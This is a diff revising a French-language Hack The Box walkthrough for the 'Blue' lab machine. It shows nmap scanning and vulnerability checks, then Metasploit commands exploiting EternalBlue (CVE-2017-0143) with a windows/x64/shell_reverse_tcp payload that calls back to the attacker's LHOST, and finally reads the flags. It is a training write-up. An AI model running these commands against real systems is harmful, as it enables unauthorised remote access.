@@ -11,25 +11,25 @@ Selon Hack The Box (HTB), Blue est l'une des machines les plus simples à résou
 
 # Enumération
 
-On commence par la recherche des ports disponibles avec l'outil Nmap
+## Recherche des ports disponibles
+On commence par rechercher les ports disponibles avec l'outil Nmap :
+
 ```shell
 sudo nmap -Pn -T4 -sV 10.10.10.40 -o/-oX/-oG <nomfichier>.format
 ```
-De préference utiliser un format de sortie qui puisse être rapidement triable quand tu vas faire du scripting dans ce cas cela n'est pas neséssaire car on va utlliser **metasploit** pour l'exploitation
+Il est recommandé d'utiliser un format de sortie facilement exploitable pour le scripting, bien que cela ne soit pas nécessaire ici, car nous utiliserons **Metasploit** pour l'exploitation.
 
 ![Premier_commande_nmap](../images/nmap_blue_command.png)
 
-Cela nous donne le resultat suivant : 
+Le résultat de cette commande est le suivant :
 
 ![Premier_resultat_nmap](../images/resultat_commande_nmap.png)
 
-Dans notre recherche sur les port ouverts, sur wikipedia on trouve que le port 445 pourrais avoir une vulnerabilité appelé "Ethernalblue".
+Dans notre recherche, nous trouvons que le port 445 pourrait être vulnérable à EternalBlue, une vulnérabilité exploitant le protocole NTtrans2 utilisé par SMBv1 en cas d'un message trop longue dans le BufferOverflow.
 
-La vulnerabilité EternalBlue profite du protocol NTtrans2 utilisé par le protocole SMBv1 en cas d'un message trop longue dans le BufferOverflow.
+Cette vulnérabilité permet à un attaquant d'exécuter du code malveillant à distance, et a été utilisée dans des attaques comme celle du ransomware WannaCry.
 
-Cela permet à un attacant d'executer du code malveillant à un ordinateur distant, cette vulnerabilité à permis la creation du ransomware WannaCry
-
-Pour confirmer si c'est qu'on dit est vrai on cherche la vulnerabilité à l'aide de nmap avec la commande suivante : 
+Pour confirmer cette vulnérabilité, on peut utiliser la commande suivante :
 
 ```shell
 sudo nmap -T4 -sV --script vuln 10.10.10.40
@@ -38,15 +38,13 @@ Et on confirme le resultat :
 
 ![vulnerabilité](../images/recherche_de_la_vulnerabilité.png)
 
-
-
-
-
 # Exploitation
 
-Maintenant dans l'exploitation de cette vulnerabilité, on va utiliser un outil appelé metasploit un outils fait pour donner de l'information sur les divers vulnerabilités existantes et aussi pour l'execution d'un exploit ou payload de manière automatisée. Dans un futur proche, on pourrais construire nous même un programme pour l'execution automatique d'un vulnerabilité à l'aide de python mais on le laissera pour une autre ocasion concentrons nous dans l'exploitation.
+Pour exploiter cette vulnérabilité, on aura besoin de **Metasploit**, un outil conçu pour fournir des informations sur diverses vulnérabilités et exécuter des exploits de manière automatisée.
 
-avec metasploit on cherche la vulneravilité founis auparavant par nmap, et on cherche la vulnerabilité qu'on considère la plus pertinent
+## Recherche de la vulnérabilité avec Metasploit
+
+On lance Metasploit et faisons la recherche de la vulnérabilité identifiée par Nmap :
 
 ```shell
 sudo msfconsole
@@ -54,12 +52,31 @@ search CVE-2017-0143
 ```
 ![search_vuln](../images/msfconsole_seach_vuln.png)
 
-pour nous la plus pertinent est l'option 0 on demande de montrer les payloads disponnibles pour ethernalblue et on choisi la plus pertinent, d'un payload appelé reverse_TCP
+Nous choisissons l'option 0 et affichons les payloads disponibles pour EternalBlue :
 
 ```shell
 use 0
 show payloads
-set payoad 14
 ```
+On sélection le payload **windows/x64/shell_reverse_tcp** :
 
+```shell
+set payload windows/x64/shell_reverse_tcp
+```
+## Configuration du payload
+
+Nous devons configurer l'IP de la victime (RHOST) et notre propre IP (LHOST) :
+
+![config_payload](../images/configuration_payload.png)
+
+```shell
+set RHOST 10.10.10.40  # IP de la machine victime
+set LHOST <Votre IP>   # Remplacez <Votre IP> par votre adresse IP
+run
+```
+![penetration_machine](../images/penetration_machine.png)
 # Elévation de « privilèges »
+
+Pour l'élévation de privilèges, il suffit de naviguer dans le bureau de chaque utilisateur et de trouver leur flag avec la commande **type**, similaire à **cat** sur Linux.
+
+![admin_flag](../images/flag_admin.png)
